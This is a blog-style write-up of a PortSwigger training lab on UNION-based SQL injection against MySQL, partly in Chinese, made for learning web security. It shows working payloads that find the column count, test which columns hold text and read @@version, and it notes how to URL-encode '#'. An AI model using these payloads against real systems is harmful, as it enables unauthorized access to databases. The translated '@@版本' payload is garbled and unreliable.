---
layout: post
title: "SQL injection attack, querying the database type and version on MySQL and Microsoft"
description: ""
date: 2023-07-11
categories:
  - PortSwigger_Lab
  - PortSwigger_SQL_Injection
author: ""
tags: ['PortSwigger_Lab', 'SQL_Injection']
---





# SQL injection attack, querying the database type and version on MySQL and Microsoft



```

This lab contains an [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

#### Hint

You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

#### Solution

1.  Use Burp Suite to intercept and modify the request that sets the product category filter.



2.  Determine the [number of columns that are being returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns) and [which columns contain text data](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text). Verify that the query is returning two columns, both of which contain text, using a payload like the following in the `category` parameter:
    
`'+UNION+SELECT+'abc','def'#`




3.  Use the following payload to display the database version:
`'+UNION+SELECT+@@version,+NULL#`




本實驗室在產品類別過濾器中包含一個 SQL 注入漏洞。 您可以使用 UNION 攻擊從注入的查詢中檢索結果。

解決實驗，顯示數據庫版本字符串。

暗示
您可以在我們的 SQL 注入備忘單上找到一些有用的有效載荷。


解決方案
使用 Burp Suite 攔截和修改設置產品類別過濾器的請求。


確定查詢返回的列數以及哪些列包含文本數據。 驗證查詢是否返回兩列，這兩列都包含文本，在 category 參數中使用如下所示的有效負載：
'+UNION+SELECT+'abc','def'#


使用以下負載顯示數據庫版本：
'+UNION+SELECT+@@版本,+NULL#

```

GET 
```
category=Gifts
```


NULL 測試UNION 注入有多少欄位

### 這裡有坑  !!!
```
//#號 如果輸入在URL 會被當錨，如果不想要被前端當成錨，進不了後端，你把它 URL encode =  %23
//但這個 #號 在MySQL 是註釋的意思
' UNION SELECT NULL,NULL#

' UNION SELECT NULL,NULL%23
```


哪個欄位是否為字串型態: 兩個都是
```
' UNION SELECT 'aaa','bbb'%23
```

cheatsheet 棒棒 給 version payload 
https://portswigger.net/web-security/sql-injection/cheat-sheet


```
' UNION SELECT @@version,'bbb'%23
```


成功。


